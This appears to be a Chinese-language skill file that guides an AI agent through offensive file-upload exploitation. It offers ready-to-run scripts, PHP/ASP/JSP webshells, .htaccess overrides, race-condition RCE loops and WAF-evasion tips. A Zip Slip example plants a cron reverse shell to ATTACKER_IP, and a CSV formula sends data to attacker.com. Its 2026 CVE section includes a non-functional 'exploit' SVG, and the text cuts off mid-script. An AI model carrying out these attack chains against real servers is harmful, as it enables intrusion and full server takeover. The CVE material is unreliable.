---
name: 页寄生·试
description: 文件上传深度测试——从扩展名/Content-Type绕过到图片马、竞争条件、解析漏洞、Zip Slip、.htaccess攻击，覆盖PHP/ASP/JSP/Node全栈的上传利用链
version: 2.0.0
---

# 文件上传深度测试

## 一、AI Agent 自动化工作流

> Agent 执行顺序：**识别上传入口 → 可接受文件类型探测 → 逐层绕过测试 → Webshell 写入 → 执行确认 → 后渗透**

### 1.1 上传功能分类

| 类型 | 典型路径 | 测试重点 |
|------|----------|----------|
| 头像/图片上传 | `/upload/avatar/`, `/profile/picture` | 图片马 + 解析漏洞 |
| 文档上传 | `/upload/doc/`, `/import` | 宏病毒 / XXE (docx) |
| 备份导入 | `/admin/restore`, `/import/backup` | Zip Slip, 路径穿越 |
| 插件/主题上传 | `/admin/plugins`, `/wp-admin/theme-install` | PHP 伪装的 ZIP |
| CSV/数据导入 | `/import/csv`, `/data/upload` | CSV 注入 |
| API 文件上传 | `/api/v1/upload`, `/graphql` multipart | 现代框架绕过 |

### 1.2 自动化检测流程

```python
import requests

UPLOAD_URL = "http://target.com/upload"
EXPECTED_EXTENSIONS = ["jpg", "jpeg", "png", "gif", "pdf", "doc", "docx", "xls", "xlsx", "csv", "zip"]

# === 步骤 1: 上传合法文件，获取上传路径 ===
r = requests.post(UPLOAD_URL, files={"file": ("test.jpg", b"GIF89a\xFF\xFF\xFF", "image/jpeg")})
baseline_path = extract_path(r)  # 如 /uploads/2024/test.jpg

# === 步骤 2: 扩展名绕过矩阵 ===
extension_payloads = [
    "shell.php", "shell.pHp", "shell.PHP",  # 大小写
    "shell.php.jpg", "shell.jpg.php",        # 双扩展名
    "shell.php;.jpg", "shell.php%00.jpg",    # 截断
    "shell.php.", "shell.php ",              # Windows 尾随字符
    "shell.phtml", "shell.pHp5", "shell.php7", # 替代扩展名
    "shell.phar", "shell.shtml",
    "shell.jsp", "shell.jspx", "shell.jspf", # JSP 变体
    "shell.asp", "shell.aspx", "shell.asa",  # ASP 变体
    "shell.cgi", "shell.pl", "shell.py",     # CGI/Python
    "shell.war",                              # Tomcat
    ".htaccess",                              # Apache
]

for ext in extension_payloads:
    r = requests.post(UPLOAD_URL, files={"file": (ext, b"<?php system($_GET[0]); ?>", "image/jpeg")})
    if r.status_code == 200 and "error" not in r.text.lower():
        print(f"[+] Upload accepted: {ext}")
```

---

## 二、扩展名/MIME 类型绕过完整矩阵

### 2.1 黑名单绕过 —— 替代可执行扩展名

```bash
# PHP 系列
.php .php3 .php4 .php5 .php7 .php8 .pht .phtm .phtml .phar .phps .phpt .pgif
.shtml .xhtml

# ASP/ASPX 系列
.asp .aspx .asa .asax .ascx .ashx .asmx .cer .cdx

# JSP 系列
.jsp .jspx .jspf .jsw .jsv .jspa

# 其他可执行
.cgi .pl .py .rb .cfm .cfc .swf .war

# Apache 配置覆盖
.htaccess .htpasswd
```

### 2.2 双扩展名绕过

```bash
# 服务端取最后一个扩展名校验 → 但 Apache 解析第一个
shell.php.jpg        # 如果只校验 .jpg
shell.php.jpeg
shell.php.png

# 反过来（服务端取第一个 → IIS 解析最后一个）
shell.jpg.php
shell.png.phtml

# 多扩展名
shell.php.xxx        # Apache AddHandler 配置不当
shell.php.shtml
```

### 2.3 截断绕过

```bash
# Null 字节截断（PHP < 5.3.4）
shell.php%00.jpg
shell.php\x00.jpg
shell.php .jpg        # 空格 + Null

# 分号截断（Windows）
shell.php;.jpg

# 点号截断（Windows，文件尾随点被自动删除）
shell.php.
shell.php......
shell.php. . . .

# 空格截断（Windows）
shell.php 
shell.php%20

# 冒号截断（Windows NTFS Alternate Data Stream）
shell.php:$DATA
shell.php::$DATA

# URL 编码 Null 字节
shell.php%2500.jpg     # 服务器先 URL 解码 %25 → %，再解码 %00 → Null
```

### 2.4 Content-Type 绕过

```bash
# 服务端只检查 Content-Type 头，不检查文件内容
Content-Type: image/jpeg       # 但文件内容是 PHP
Content-Type: image/png
Content-Type: image/gif
Content-Type: text/plain
Content-Type: application/octet-stream
Content-Type: application/x-php # 某些服务器反而接受
```

### 2.5 PHP 特殊：.htaccess 攻击

```apache
# 上传 .htaccess 使任意扩展名被解析为 PHP
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .txt

# 或者使某个特定文件被解析
<FilesMatch "hack.jpg">
  SetHandler application/x-httpd-php
</FilesMatch>

# 包含预处理
php_value auto_prepend_file /etc/passwd
php_value auto_append_file /tmp/shell.php
```

---

## 三、文件内容绕过（Magic Bytes 欺骗）

### 3.1 图片马（Image Polyglot）

```bash
# === GIF 图片马 ===
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif
# GIF89a 是最短的图片 Magic Header

# === PNG 图片马 ===
# 使用 exiftool 在 PNG 注释中嵌入 PHP
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.png -o shell.png

# === JPEG 图片马 ===
# 使用 exiftool 嵌入
exiftool -ImageDescription='<?php system($_GET["cmd"]); ?>' image.jpg
# 或使用 jhead
jhead -ce image.jpg  # 编辑 Comment

# === 手动构造 PNG 图片马 ===
python3 -c "
import struct
# PNG 签名
png = b'\x89PNG\r\n\x1a\n'
# tEXt 块中嵌入 PHP
php = b'<?php system(\$_GET[\"c\"]); __halt_compiler();?>'
chunk = struct.pack('>I', len(php)) + b'tEXt' + php + struct.pack('>I', 0)
# IEND 块
iend = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', 0xAE426082)
with open('shell.png', 'wb') as f: f.write(png + chunk + iend)
"
```

### 3.2 其他文件类型伪装

```bash
# PDF 内嵌 PHP
echo '%PDF-1.4 <?php system($_GET["c"]); ?>' > shell.pdf

# ZIP 内嵌（某些解压库会忽略前缀字节）
python3 -c "
data = b'PK\x03\x04' + b'\x00'*22 + b'<?php system(\$_GET[0]); __halt_compiler();?>'
with open('shell.zip', 'wb') as f: f.write(data)
"

# SVG XXE + XSS
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
  <script>alert(document.cookie)</script>
</svg>
```

### 3.3 getimagesize() 绕过

```php
// PHP 常见校验: if(getimagesize($_FILES['file']['tmp_name']))
// 绕过: 在 PHP 代码前添加合法图片头部
<?php
// 最小 BMP 头
echo "\x42\x4D\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00\x00\x00";
echo '<?php system($_GET["cmd"]); __halt_compiler();?>';
?>
```

---

## 四、解析漏洞利用

### 4.1 Apache 解析漏洞

```
# 从右向左解析，直到找到可识别的扩展名
shell.php.xxx  → 如果 .xxx 不可识别，尝试 .php → 解析为 PHP
shell.php.xxx.yyy → 尝试 .yyy → .xxx → .php → 解析为 PHP

# .htaccess 覆盖 + 图片马
.htaccess: AddType application/x-httpd-php .jpg
shell.jpg:  <?php system($_GET[0]);?>  → 访问 shell.jpg 被解析为 PHP
```

### 4.2 IIS 解析漏洞

```
# IIS 6.0 文件名截断
shell.asp;.jpg  → 截断分号后内容 → 解析为 ASP
shell.asp:.jpg → NTFS ADS → 解析为 ASP

# IIS 7.x/8.x 路径解析
/upload/shell.jpg/.php → IIS 会尝试用 PHP 解析 shell.jpg
/upload/shell.jpg%00.php → Null 字节截断

# web.config 覆盖
上传 web.config，允许 .jpg 作为 PHP 执行
```

### 4.3 Nginx 解析漏洞

```
# 低版本 Nginx + PHP-FPM FastCGI 配置不当
/upload/shell.jpg/.php  → Nginx 不校验文件存在性 → PHP-FPM 解析 shell.jpg 为 PHP
/upload/shell.jpg%00.php → Null 字节绕过

# 修复：cgi.fix_pathinfo=0, try_files 检查
```

### 4.4 Tomcat / JBoss 解析漏洞

```bash
# WAR 包部署
# 将 JSP Webshell 打包为 WAR 上传
jar -cvf shell.war shell.jsp
# 上传到 /manager/html 或自动部署目录

# JSPX 绕过（如果 .jsp 被过滤）
# 重命名为 .jspx，使用合法 XML 格式
```

---

## 五、竞争条件（Race Condition）

### 5.1 上传-包含竞争

```python
import threading, requests

UPLOAD_URL = "http://target.com/upload"
SHELL_URL = "http://target.com/uploads/shell.php"
SHELL_CONTENT = b'<?php system($_GET["c"]); ?>'

def upload():
    while True:
        r = requests.post(UPLOAD_URL, files={"file": ("shell.php", SHELL_CONTENT)})
        if r.status_code == 200:
            print("[+] Uploaded")

def access():
    while True:
        r = requests.get(SHELL_URL, params={"c": "id"})
        if r.status_code == 200 and "uid=" in r.text:
            print(f"[!] RCE: {r.text}")
            with open("rce_output.txt", "w") as f: f.write(r.text)
            break

# 同时启动上传和访问线程
for _ in range(20):
    threading.Thread(target=upload, daemon=True).start()
for _ in range(20):
    threading.Thread(target=access, daemon=True).start()
```

### 5.2 临时文件竞争

```bash
# PHP 上传的临时文件路径可预测
# /tmp/phpXXXXXX → 在文件被 move_uploaded_file 前读取

# 如果应用使用 copy() 而非 move_uploaded_file()
# 上传大文件 → 复制过程中竞争读取
```

---

## 六、高级攻击技术

### 6.1 Zip Slip

```python
import zipfile

# 创建包含路径穿越的恶意 ZIP
zf = zipfile.ZipFile("evil.zip", "w")
zf.writestr("../../../var/www/html/shell.php", '<?php system($_GET[0]); ?>')
zf.writestr("../../../../etc/cron.d/backdoor", 
    '* * * * * root bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"\n')
zf.close()

# 利用 symlink（需要 --symlinks 标志解压）
# ln -s /etc/passwd passwd_link
# zip --symlinks evil.zip passwd_link
```

### 6.2 Phar 反序列化

```php
<?php
// 创建恶意 Phar 文件，利用 PHP 的 Phar 反序列化漏洞
class Exploit {
    public $cmd = "id";
    function __destruct() { system($this->cmd); }
}
$phar = new Phar("exploit.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "test");
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$o = new Exploit();
$phar->setMetadata($o);
$phar->stopBuffering();
// 上传 exploit.phar 并触发 phar:// 流包装器
// phar://uploads/exploit.phar/test.txt
// 或通过文件操作函数自动反序列化
?>
```

### 6.3 SVG → XXE → SSRF → RCE 链

```xml
<!-- 上传 SVG 触发 XXE -->
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>

<!-- SVG 内嵌 JS (如果被浏览器渲染) -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>

<!-- SVG SSRF -->
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<svg>&ssrf;</svg>
```

### 6.4 CSV 注入

```csv
# 上传恶意 CSV，当管理员在 Excel 中打开时执行
Name,Email,Note
=cmd|'/c calc'!A0,test@test.com,test
=HYPERLINK("http://attacker.com/?d="&A2&B2, "Click"),test@test.com,test
=DDE("cmd";"/c calc";"__DdeLink_1"),test@test.com,test
@SUM(1+1)*cmd|'/c calc'!A0,test@test.com,test
```

---

## 七、特定框架/CMS 攻击

### 7.1 WordPress

```bash
# 主题/插件上传
# 上传包含后门的 ZIP 主题
zip shell.zip shell.php
# WordPress Admin → Appearance → Themes → Upload Theme

# 如果限制了 ZIP 内容类型，可以使用图片马
# 在 theme 的 .php 文件中嵌入后门
```

### 7.2 通用绕过方法

```bash
# 修改 filename 字段
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Disposition: form-data; name="file"; filename="shell.php%00.jpg"

# 多文件上传（某些解析器会有差异）
Content-Disposition: form-data; name="file[]"; filename="shell.jpg"
Content-Disposition: form-data; name="file[]"; filename="shell.php"

# 覆盖原有文件（文件名冲突处理不当）
# 上传 config.php 覆盖目标配置文件
```

---

## 八、Webshell 一句话木马大全

```php
<!-- PHP 一句话 -->
<?php system($_GET['c']); ?>
<?php eval($_POST['pwd']); ?>
<?php assert($_POST['pwd']); ?>
<?=exec($_GET[0])?>
<?=`$_GET[0]`?>
<script language="php">eval($_POST['pwd']);</script>

<!-- ASP 一句话 -->
<%eval request("pwd")%>
<%execute(request("pwd"))%>

<!-- ASPX 一句话 -->
<%@ Page Language="Jscript"%><%eval(Request.Item["pwd"],"unsafe");%>

<!-- JSP 一句话 -->
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
<% new java.io.File(application.getRealPath("/")).list() %>

<!-- Node.js (如果上传覆盖路由文件) -->
require('child_process').exec(req.query.cmd)
```

---

## 九、快速检查清单

```markdown
□ [ ] 识别所有文件上传入口
□ [ ] 确认上传目录位置和访问 URL
□ [ ] 测试允许的文件类型
□ [ ] 测试大小写变体 (.PHP, .PhP)
□ [ ] 测试双扩展名 (.php.jpg, .jpg.php)
□ [ ] 测试 Null 字节截断 (.php%00.jpg)
□ [ ] 测试 Content-Type 绕过
□ [ ] 测试 Magic Bytes 绕过（图片马）
□ [ ] 测试 .htaccess 上传 + 覆盖
□ [ ] 测试解析漏洞 (Apache/IIS/Nginx)
□ [ ] 测试竞争条件（上传-访问竞争）
□ [ ] 测试路径穿越 (../../shell.php)
□ [ ] 测试 Zip Slip（如支持 ZIP 上传）
□ [ ] 测试 SVG XXE / XSS
□ [ ] 测试 Phar 反序列化
□ [ ] 确认 Webshell 可执行
□ [ ] 记录所有绕过方法和路径
```

---

## 十、证据收集模板

```json
{
  "vulnerability": "Unrestricted File Upload / File Upload to RCE",
  "type": "Extension Bypass / Content-Type Bypass / .htaccess Override / Race Condition",
  "url": "http://target.com/upload",
  "bypass_method": "Double extension (.php.jpg) + Content-Type spoofing",
  "uploaded_file": "/uploads/2024/shell.php.jpg",
  "webshell_url": "http://target.com/uploads/2024/shell.php.jpg?c=id",
  "command_output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
  "impact": "可上传并执行任意服务器端代码，完全控制 Web 服务器",
  "parse_vulnerability": "Apache 2.4.x mod_mime 从右向左解析",
  "remediation": "1. 白名单限制扩展名 2. 检查文件内容（Magic Bytes + 内容）3. 上传目录禁用脚本执行 4. 随机文件名 5. 文件大小和类型双重校验",
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
  "evidence_files": ["screenshots/upload_success.png", "screenshots/webshell_exec.png"]
}
```

---

## 十一、2026 EMERGING TECHNIQUES

> 2026年文件上传攻击的核心转变：**媒体解码器漏洞 + AI模型文件作为RCE载体**。一个50KB的视频或一个pickle模型即可在服务器自动生成缩略图/加载模型时触发RCE，无需用户交互。

### 11.1 FFmpeg "PixelSmash" — CVE-2026-8461 (2026-06-22, JFrog披露)

默认启用的 **MagicYUV** 解码器在缓冲区分配计算与切片处理逻辑上严重不匹配。多线程处理高清帧时，色度平面数据处理比预期多吐出**一整行**，导致单行堆缓冲区溢出。

**攻击链极隐蔽**：仅需上传一个50KB的恶意视频文件（AVI/MKV/MOV），服务器若自动启动元数据扫描或生成预览缩略图即触发，**无需用户播放**。

波及范围：Kodi / mpv / OBS Studio / Jellyfin / Emby / Nextcloud / Immich / PhotoPrism 及几乎所有依赖FFmpeg生成缩略图的系统。修复版本 **FFmpeg 8.1.2**。

**PixelSmash PoC概念**（仅概念，构造需精确匹配分辨率/线程数）：

```python
# 概念：构造MagicYUV帧使色度行数与分配不匹配
# 关键：height为奇数时 chroma plane 计算多一行
# AVI容器 + MagicYUV FourCC + 畸形帧尺寸
import struct
fourcc = b'M8Y0'            # MagicYUV codec
width, height = 1920, 1081  # 奇数高度触发多一行处理
# 帧数据：chroma plane 比 luma 多分配一行 → 堆溢出
# 完整PoC需精确计算 slice count 与线程映射，参考JFrog技术分析
```

**临时缓解**：关闭自动缩略图生成；用白名单重新编译FFmpeg剥离冷门解码器（`--disable-decoder=magicyuv`）。

### 11.2 ImageMagick — CVE-2026-56379 命令注入

攻击者构造恶意SVG，注入 **MVG (Magick Vector Graphics)** 命令在渲染时执行：

```xml
<!-- exploit.svg -->
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="mvg:/usr/local/share/ImageMagick-7/source/delegate.svg"
         width="200" height="200"/>
  <!-- MVG命令注入：通过 MVG 指令执行 shell -->
  <script type="image/svg+xml">
    push graphic-context
    viewbox 0 0 640 480
    image over 0,0 0,0 'ephemeral:/dev/stdin'
    pop graphic-context
  </script>
</svg>
```

上传后服务器调用 `convert exploit.svg thumb.png` 即触发MVG解析器执行注入命令。缓解：禁用MVG/SVG delegate，使用 `policy.xml` 限制 `<policy domain="coder" rights="none" pattern="MVG"/>`。

### 11.3 Cloud / Serverless 文件上传 (2026)

| 环境 | 攻击向量 |
|---|---|
| **AWS S3 presigned URL** | 路径权限提升：上传到错误bucket路径（`/public/` vs `/private/`）；presigned key scope过宽 |
| **Lambda 处理上传** | `/tmp` 目录竞争条件（多Lambda并发复用同一执行环境 `/tmp` 残留文件） |
| **Cloudflare Workers** | 文件处理WAF绕过：Worker内联解析文件时绕过边缘WAF规则 |
| **GCP Cloud Run** | 容器层叠文件覆盖（覆盖 `entrypoint.sh` 实现持久化） |

### 11.4 AI/LLM 模型文件上传作为RCE载体 (2026)

模型文件应被视为**可执行制品**（交叉链接 [ai-llm-attack-surface](../ai-llm-attack-surface/SKILL.md) 与 [deserialization-insecure](../deserialization-insecure/SKILL.md)）：

| CVE | 载体 | CVSS |
|---|---|---|
| **CVE-2026-5760** | SGLang 投毒GGUF的 `chat_template` SSTI → RCE | 9.8 |
| **CVE-2025-32434** | PyTorch `torch.load` 反序列化 RCE | 9.8 |
| pickle/GGUF通用 | 上传恶意pickle/GGUF模型到推理服务 | 9.0+ |

**SGLang GGUF chat_template SSTI PoC概念**：

```python
# 恶意GGUF：在 chat_template 字段注入 Jinja2 SSTI
chat_template = """
{{ self.__class__.__mro__[1].__subclasses__()[X]("id", shell=True,
       cwd="/tmp").communicate() }}
"""
# 推理服务加载模型 → 渲染chat_template → Jinja2 SSTI → RCE
```

### 11.5 2026 文件上传绕过技术

- **Content-Type混淆在HTTP/3中**：QUIC流的多路复用使Content-Type校验在网关与后端间产生时序差异
- **双扩展名在Nginx alias配置中的路径遍历**：`location /upload/ { alias /var/www/uploads/; }` + `shell.php/../../../etc/passwd` 触发alias路径穿越
- **Polyglot文件持久化**：同时是有效图片和有效JS/PHP的polyglot在2026 CDN缓存中被持久化投毒（缓存键仅基于Content-Type，不校验内容）

### 11.6 2026 文件上传测试清单

```
□ 测试视频/媒体上传：FFmpeg PixelSmash CVE-2026-8461 (MagicYUV)
□ 测试SVG上传：ImageMagick CVE-2026-56379 MVG命令注入
□ 云环境：S3 presigned URL路径权限、Lambda /tmp竞争、CF Workers绕过
□ AI模型上传：SGLang CVE-2026-5760 (GGUF chat_template)、torch.load CVE-2025-32434
□ HTTP/3 Content-Type混淆绕过
□ Nginx alias + 双扩展名路径遍历
□ Polyglot文件 (图片+JS/PHP) CDN缓存投毒
□ 模型文件按可执行制品对待：沙箱加载、哈希校验、签名验证
```

---

## PRACTICAL ATTACK CHAINS (2026)

> 本节提供完整、可立即使用的实战攻击链，每条链包含真实命令、分步利用过程、检测绕过技术与 2026 CVE 引用。所有代码注释均为中文。

---

### 攻击链 1：通过 Content-Type 操纵绕过文件类型校验

**场景**：目标应用仅校验 HTTP 请求中的 `Content-Type` 头来判断文件类型，不检查文件扩展名和文件内容（Magic Bytes）。攻击者通过伪造 Content-Type 头上传 PHP webshell。

**前置条件**：
- 服务端仅依赖 `Content-Type` 头校验（常见于快速开发的 API）
- 上传目录允许脚本执行（或可通过其他方式触发执行）
- 无 WAF 或 WAF 不深度检测文件内容

**分步利用**：

```bash
# === 步骤 1：探测上传接口的校验逻辑 ===
# 上传正常图片文件作为基线
curl -s -X POST "http://target.com/upload" \
  -F "file=@test.jpg;type=image/jpeg" \
  -w "\n%{http_code}"
# 预期：200，返回上传路径

# 上传 PHP 文件但使用正确的 Content-Type → 测试是否仅检查 Content-Type
curl -s -X POST "http://target.com/upload" \
  -F "file=@shell.php;type=image/jpeg" \
  -w "\n%{http_code}"
# 如果返回 200 → 服务端仅校验 Content-Type

# === 步骤 2：构造 PHP webshell 并伪造 Content-Type ===
# 创建 webshell 文件
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 伪造 Content-Type 为 image/jpeg 上传
curl -s -X POST "http://target.com/upload" \
  -F "file=@shell.php;type=image/jpeg;filename=shell.php"

# === 步骤 3：多种 Content-Type 伪造变体 ===
# 变体 A：伪造为 image/png
curl -s -X POST "http://target.com/upload" \
  -F "file=@shell.php;type=image/png;filename=shell.php"

# 变体 B：伪造为 application/octet-stream（通用二进制类型）
curl -s -X POST "http://target.com/upload" \
  -F "file=@shell.php;type=application/octet-stream;filename=shell.php"

# 变体 C：使用非法/空 Content-Type 触发默认处理
curl -s -X POST "http://target.com/upload" \
  -F "file=@shell.php;type=;filename=shell.php"

# 变体 D：多重 Content-Type 头（某些解析器取第一个或最后一个）
curl -s -X POST "http://target.com/upload" \
  -H "Content-Type: image/jpeg" \
  -F "file=@shell.php;type=image/jpeg;filename=shell.php"

# === 步骤 4：结合扩展名绕过的组合攻击 ===
# Content-Type 伪造 + 双扩展名（应对同时检查扩展名的情况）
curl -s -X POST "http://target.com/upload" \
  -F "file=@shell.php;type=image/jpeg;filename=shell.php.jpg"

# Content-Type 伪造 + 空字节截断（PHP < 5.3.4）
curl -s -X POST "http://target.com/upload" \
  -F "file=@shell.php;type=image/jpeg;filename=shell.php%00.jpg"

# === 步骤 5：Python 自动化 Content-Type 绕过扫描 ===
python3 -c "
import requests

target = 'http://target.com/upload'
# webshell 内容
shell_content = b'<?php system(\$_GET[\"cmd\"]); ?>'

# Content-Type 伪造矩阵
content_types = [
    'image/jpeg',
    'image/png', 
    'image/gif',
    'image/webp',
    'application/octet-stream',
    'text/plain',
    'application/x-php',           # 某些服务器反而接受
    'application/pdf',
    'multipart/form-data',          # 异常类型测试
    '',                             # 空类型
]

# 文件名变体
filenames = [
    'shell.php',           # 直接 PHP
    'shell.php.jpg',       # 双扩展名
    'shell.phtml',         # 替代扩展名
    'shell.php%00.jpg',    # 空字节截断
    'shell.php.',          # 尾随点（Windows）
    'shell.PHP',           # 大小写
]

for ct in content_types:
    for fn in filenames:
        files = {'file': (fn, shell_content, ct)}
        r = requests.post(target, files=files)
        if r.status_code == 200 and 'error' not in r.text.lower():
            print(f'[+] 上传成功: filename={fn}, Content-Type={ct}')
            # 尝试从响应中提取上传路径
            if 'path' in r.json():
                uploaded = r.json()['path']
                # 验证 webshell 是否可执行
                verify = requests.get(f'http://target.com/{uploaded}', params={'cmd': 'id'})
                if 'uid=' in verify.text:
                    print(f'    [!] RCE 确认: {uploaded}')
"
```

**检测绕过技术**：
- WAF 检测 `Content-Type: application/x-php` → 伪造为 `image/jpeg` 或 `application/octet-stream`
- 服务端同时检查文件头（Magic Bytes）→ 在 PHP 代码前添加 `GIF89a` 或 `\x89PNG` 图片头
- 服务端使用 `finfo_file()` 检测真实类型 → 使用真正的图片 polyglot（见攻击链 4）
- WAF 检测 multipart boundary 中的 filename → 使用 `filename*=UTF-8''shell.php`（RFC 5987 编码）

---

### 攻击链 2：上传 .htaccess 绕过执行限制

**场景**：目标上传目录配置了禁止执行 PHP 脚本（如 Apache 配置 `<Directory /uploads> php_admin_flag engine off </Directory>`），但允许上传任意文件。通过上传 `.htaccess` 文件覆盖目录的 PHP 执行限制，使后续上传的图片马被解析为 PHP。

**前置条件**：
- Web 服务器为 Apache（`.htaccess` 是 Apache 特有机制）
- `AllowOverride` 配置允许 `.htaccess` 覆盖（默认 `AllowOverride All`）
- 上传未过滤 `.htaccess` 文件名
- 上传目录可写入且可被 Web 访问

**分步利用**：

```bash
# === 步骤 1：上传 .htaccess 使 .jpg 文件被解析为 PHP ===
# 构造 .htaccess 内容
cat > .htaccess << 'EOF'
# 使所有 .jpg 文件被 Apache 当作 PHP 解析
AddType application/x-httpd-php .jpg

# 或者更精确地匹配特定文件
<FilesMatch "shell\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>
EOF

# 上传 .htaccess 到目标上传目录
curl -s -X POST "http://target.com/upload" \
  -F "file=@.htaccess;type=text/plain;filename=.htaccess"

# === 步骤 2：上传伪装为 .jpg 的 PHP webshell ===
# 创建图片马（GIF 头 + PHP 代码）
echo -ne 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.jpg

# 上传图片马
curl -s -X POST "http://target.com/upload" \
  -F "file=@shell.jpg;type=image/jpeg;filename=shell.jpg"

# === 步骤 3：触发执行 ===
# .htaccess 已使 .jpg 被解析为 PHP，直接访问执行
curl -s "http://target.com/uploads/shell.jpg?cmd=id"

# === 步骤 4：高级 .htaccess 利用变体 ===
# 变体 A：使用 php_value 修改 PHP 配置
cat > .htaccess << 'EOF'
# 禁用 disable_functions 限制
php_value disable_functions ""

# 设置 auto_prepend_file 包含恶意文件
php_value auto_prepend_file "/tmp/.hidden_shell.php"

# 修改 open_basedir 扩展文件访问范围
php_value open_basedir "/"

# 使 .txt 文件被解析为 PHP
AddType application/x-httpd-php .txt .log .cache
EOF

curl -s -X POST "http://target.com/upload" \
  -F "file=@.htaccess;type=text/plain;filename=.htaccess"

# 上传 .txt 格式的 webshell
echo '<?php system($_GET["cmd"]); ?>' > config.txt
curl -s -X POST "http://target.com/upload" \
  -F "file=@config.txt;type=text/plain;filename=config.txt"

# 触发执行
curl -s "http://target.com/uploads/config.txt?cmd=id"

# === 步骤 5：绕过 .htaccess 文件名过滤 ===
# 如果目标过滤 .htaccess 文件名，尝试以下变体：
# 变体 A：大小写（Apache 在 Windows 上不区分大小写）
curl -s -X POST "http://target.com/upload" \
  -F "file=@.htaccess;type=text/plain;filename=.HTACCESS"

# 变体 B：利用 Apache 配置指令覆盖
# 上传 .user.ini（PHP-FPM/FastCGI 模式下的替代方案）
cat > .user.ini << 'EOF'
# PHP-FPM 模式下 .user.ini 等效于 .htaccess
auto_prepend_file="/tmp/.hidden_shell.php"
EOF

curl -s -X POST "http://target.com/upload" \
  -F "file=@.user.ini;type=text/plain;filename=.user.ini"

# === 步骤 6：自动化 .htaccess 攻击脚本 ===
python3 -c "
import requests

target_upload = 'http://target.com/upload'
upload_dir = 'http://target.com/uploads/'

# .htaccess 配置内容
htaccess_configs = [
    # 配置 1：使 .jpg 解析为 PHP
    b'AddType application/x-httpd-php .jpg',
    # 配置 2：使所有文件解析为 PHP
    b'SetHandler application/x-httpd-php',
    # 配置 3：精确文件匹配
    b'<FilesMatch \"shell\">\\nSetHandler application/x-httpd-php\\n</FilesMatch>',
    # 配置 4：auto_prepend_file
    b'php_value auto_prepend_file \"/tmp/.shell.php\"',
]

# 尝试上传 .htaccess
for i, config in enumerate(htaccess_configs):
    files = {'file': ('.htaccess', config, 'text/plain')}
    r = requests.post(target_upload, files=files)
    print(f'[*] 配置 {i+1} 上传响应: {r.status_code}')
    
    # 上传测试 webshell
    shell = b'GIF89a<?php system(\$_GET[\"cmd\"]); ?>'
    files = {'file': ('shell.jpg', shell, 'image/jpeg')}
    requests.post(target_upload, files=files)
    
    # 验证执行
    r = requests.get(upload_dir + 'shell.jpg', params={'cmd': 'id'})
    if 'uid=' in r.text:
        print(f'[+] .htaccess 配置 {i+1} 成功! RCE: {r.text[:100]}')
        break
"
```

**检测绕过技术**：
- 目标过滤 `.htaccess` 文件名 → 使用 `.user.ini`（PHP-FPM 模式）或利用 Windows 大小写不敏感
- WAF 检测 `.htaccess` 内容关键字（如 `AddType`、`SetHandler`）→ 使用 `AddHandler` 替代，或使用 `mod_rewrite` 规则间接执行
- 目标使用 Nginx（不支持 .htaccess）→ 改用上传 `web.config`（IIS）或利用 Nginx 配置错误
- `AllowOverride None`（禁止 .htaccess）→ 无法利用此方法，需寻找其他上传绕过

---

### 攻击链 3：文件上传竞争条件（上传-删除窗口利用）

**场景**：目标应用上传文件后先保存到可访问目录，再进行安全检查（如病毒扫描、扩展名校验），检查不通过则删除文件。在文件被保存到被删除之间存在一个时间窗口（通常几十毫秒到几秒），攻击者通过高并发请求在此窗口内访问并执行上传的文件。

**前置条件**：
- 服务端先保存文件再校验（check-after-write 模式）
- 上传目录可直接通过 URL 访问
- 文件在校验失败后被删除，但删除前可被并发访问

**分步利用**：

```bash
# === 步骤 1：分析上传-删除时序 ===
# 上传一个会被拒绝的文件（如 .php），观察响应时间
time curl -s -X POST "http://target.com/upload" \
  -F "file=@shell.php;type=image/jpeg;filename=shell.php"
# 如果返回"文件类型不允许"但响应耗时 > 100ms → 存在时间窗口

# === 步骤 2：构造高并发竞争利用脚本 ===
python3 -c "
import threading
import requests
import time
import sys

UPLOAD_URL = 'http://target.com/upload'
# 上传后文件的预期访问路径（需根据实际响应调整）
SHELL_URL = 'http://target.com/uploads/shell.php'
# webshell 内容：执行命令并写入标记文件
SHELL_CONTENT = b'<?php system(\$_GET[\"cmd\"]); ?>'
# 要执行的命令
CMD = 'id'

success = False

def upload_shell():
    '''持续上传 webshell 文件'''
    global success
    while not success:
        try:
            files = {'file': ('shell.php', SHELL_CONTENT, 'image/jpeg')}
            r = requests.post(UPLOAD_URL, files=files, timeout=5)
        except:
            pass

def access_shell():
    '''持续访问上传的文件，在删除前触发执行'''
    global success
    while not success:
        try:
            r = requests.get(SHELL_URL, params={'cmd': CMD}, timeout=2)
            if r.status_code == 200 and 'uid=' in r.text:
                print(f'[+] 竞争成功! RCE 输出: {r.text.strip()[:200]}')
                success = True
                # 写入持久化 webshell
                requests.get(SHELL_URL, params={
